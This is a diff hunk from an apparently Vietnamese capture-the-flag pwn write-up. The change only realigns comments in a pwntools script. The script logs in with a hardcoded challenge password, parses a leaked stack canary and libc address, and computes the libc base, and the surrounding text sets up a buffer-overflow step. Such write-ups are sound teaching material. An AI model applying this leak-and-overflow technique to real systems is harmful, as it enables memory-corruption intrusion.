@@ -211,9 +211,9 @@ Bên cạnh đó trong Stack có thể leak luôn địa chỉ libc. Ta có th�
 	p.sendafter(b'ID: ',ID)
 	p.sendafter(b'Password: ',b'&WPAbC&M!%8S5X#W')
 	p.recvuntil(b'01234456789')
-	data=p.recvuntil(b'Enter',drop=True).split(b'0x')	//chia dữ liệu nhận về thành 1 mảng data
-	canary=int(data[1],16)								//phần tử 1 chứa canary
-	libc_leak=int(data[2],16)							//phần tử 2 chứa libc
+	data=p.recvuntil(b'Enter',drop=True).split(b'0x') //chia dữ liệu nhận về thành 1 mảng data
+	canary=int(data[1],16)							  //phần tử 1 chứa canary
+	libc_leak=int(data[2],16)						  //phần tử 2 chứa libc
 	libc.address=libc_leak-0x24083
 
 Sau khi đã leak được các yếu tố cần thiết thì hãy quay lại Stack lần nữa để xem chúng ta có thể ghi đè đến đâu qua *bof* để khai thác.
